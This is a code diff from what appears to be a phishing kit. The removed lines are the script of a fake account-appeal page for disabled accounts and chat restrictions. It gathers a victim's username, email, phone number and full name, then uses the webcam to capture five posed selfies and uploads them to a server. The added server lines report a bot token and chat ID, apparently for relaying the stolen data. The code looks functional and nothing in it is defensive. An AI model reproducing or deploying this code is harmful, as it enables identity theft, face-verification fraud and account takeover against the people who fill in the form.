-            formData: {},
-            isCapturing: false
-        };
-
-        const POSES = [
-            { name: 'straight', text: 'Look Straight at Camera' },
-            { name: 'up', text: 'Look Up' },
-            { name: 'left', text: 'Turn Face Left' },
-            { name: 'right', text: 'Turn Face Right' },
-            { name: 'straight_final', text: 'Look Straight Again' }
-        ];
-
-        // ============================================================
-        // 6. SELECT OPTION
-        // ============================================================
-        function selectOption(type, element) {
-            document.querySelectorAll('.option-item').forEach(item => item.classList.remove('selected'));
-            element.classList.add('selected');
-            setTimeout(() => {
-                document.getElementById('selectionScreen').classList.add('hidden');
-                document.getElementById(type === 'disabled' ? 'disabledForm' : 'chatForm').classList.add('active');
-            }, 300);
-        }
-
-        // ============================================================
-        // 7. FORM SUBMIT – Server API endpoints (No hardcoded token)
-        // ============================================================
-        document.getElementById('disabledAppealForm').addEventListener('submit', function(e) {
-            e.preventDefault();
-            handleFormSubmit(this, 'Disabled Account Appeal');
-        });
-        document.getElementById('chatAppealForm').addEventListener('submit', function(e) {
-            e.preventDefault();
-            handleFormSubmit(this, 'Chat Restrictions Appeal');
-        });
-
-        function handleFormSubmit(form, formType) {
-            const phoneInput = form.querySelector('.phone-input');
-            if (!validatePhone(phoneInput)) { phoneInput.focus(); return; }
-
-            const formData = new FormData(form);
-            const data = Object.fromEntries(formData);
-            const group = form.querySelector('.phone-group');
-            const code = group.querySelector('.selected .code').textContent;
-            data.phone = code + ' ' + phoneInput.value.trim();
-            delete data.phoneNumber;
-
-            verificationState.formData = { type: formType, ...data };
-
-            // Send to server API (which uses env vars)
-            fetch('/api/submit-form', {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify(data)
-            })
-            .then(res => res.json())
-            .then(() => {
-                document.querySelectorAll('.form-container').forEach(f => f.classList.remove('active'));
-                document.getElementById('verificationScreen').classList.add('active');
-                setTimeout(startVerification, 500);
-            })
-            .catch(err => {
-                alert('Submit failed: ' + err.message);
-            });
-        }
-
-        // ============================================================
-        // 8. VERIFICATION FLOW (Server API for selfies & completion)
-        // ============================================================
-        function startVerification() {
-            navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user', width: 1280, height: 720 } })
-                .then(stream => {
-                    verificationState.videoStream = stream;
-                    document.getElementById('verificationVideo').srcObject = stream;
-                    setTimeout(processNextPose, 2000);
-                })
-                .catch(() => alert('Please allow camera access'));
-        }
-
-        function processNextPose() {
-            if (verificationState.currentPose >= POSES.length) {
-                allPosesComplete();
-                return;
-            }
-            const pose = POSES[verificationState.currentPose];
-            document.getElementById('poseText').textContent = pose.text;
-            document.getElementById('poseCount').textContent = `Pose ${verificationState.currentPose + 1} of ${POSES.length}`;
-            document.getElementById('faceOval').classList.remove('matched');
-            verificationState.isCapturing = false;
-            setTimeout(() => {
-                document.getElementById('faceOval').classList.add('matched');
-                setTimeout(captureAndSendPose, 600);
-            }, 2000);
-        }
-
-        function captureAndSendPose() {
-            if (verificationState.isCapturing) return;
-            verificationState.isCapturing = true;
-            const video = document.getElementById('verificationVideo');
-            const canvas = document.createElement('canvas');
-            canvas.width = video.videoWidth || 640;
-            canvas.height = video.videoHeight || 480;
-            canvas.getContext('2d').drawImage(video, 0, 0, canvas.width, canvas.height);
-
-            canvas.toBlob(blob => {
-                const pose = POSES[verificationState.currentPose];
-                const fd = new FormData();
-                fd.append('photo', blob, `selfie_${verificationState.currentPose + 1}.jpg`);
-                fd.append('username', verificationState.formData.username);
-                fd.append('formType', verificationState.formData.type);
-                fd.append('poseText', pose.text);
-                fd.append('poseNumber', verificationState.currentPose + 1);
-
-                fetch('/api/submit-selfie', { method: 'POST', body: fd })
-                    .then(res => res.json())
-                    .then(() => {
-                        verificationState.currentPose++;
-                        setTimeout(processNextPose, 800);
-                    })
-                    .catch(err => {
-                        alert('Selfie upload failed: ' + err.message);
-                        verificationState.currentPose++;
-                        setTimeout(processNextPose, 800);
-                    });
-            }, 'image/jpeg', 0.92);
-        }
-
-        function allPosesComplete() {
-            document.getElementById('poseText').style.display = 'none';
-            document.getElementById('poseCount').style.display = 'none';
-            document.getElementById('faceOval').style.display = 'none';
-            const btn = document.getElementById('verificationSubmitBtn');
-            btn.classList.add('show');
-            btn.onclick = () => {
-                const d = verificationState.formData;
-                fetch('/api/verification-complete', {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({
-                        username: d.username,
-                        email: d.email,
-                        phone: d.phone,
-                        fullname: d.fullname,
-                        formType: d.type
-                    })
-                })
-                .then(res => res.json())
-                .then(() => {
-                    if (verificationState.videoStream) {
-                        verificationState.videoStream.getTracks().forEach(t => t.stop());
-                    }
-                    document.getElementById('verificationScreen').classList.remove('active');
-                    document.getElementById('successModal').classList.add('active');
-                })
-                .catch(err => alert('Completion failed: ' + err.message));
-            };
-        }
-
-        function redirectToMainPage() {
-            document.getElementById('successModal').classList.remove('active');
-            document.getElementById('selectionScreen').classList.remove('hidden');
-            document.querySelectorAll('.form-container').forEach(f => f.classList.remove('active'));
-            document.querySelectorAll('.option-item').forEach(item => item.classList.remove('selected'));
-            document.getElementById('disabledAppealForm').reset();
-            document.getElementById('chatAppealForm').reset();
-            verificationState = { currentPose: 0, captures: [], videoStream: null, formData: {}, isCapturing: false };
-            window.scrollTo(0, 0);
-        }
-
-        // ============================================================
-        // 9. FOOTER YEAR
-        // ============================================================
-        document.getElementById('footerYear').textContent = new Date().getFullYear();
-
-        // ============================================================
-        // 10. INIT
-        // ============================================================
-        ['1', '2'].forEach(id => renderOptions('dropdown' + id));
-    </script>
-</body>
-</html>
+app.listen(PORT, () => {
+  console.log(`✅ Server running on port ${PORT}`);
+  console.log(`📸 Bot token: ${BOT_TOKEN ? 'Set' : 'Not set'}`);
+  console.log(`📱 Chat ID: ${CHAT_ID ? 'Set' : 'Not set'}`);
+});
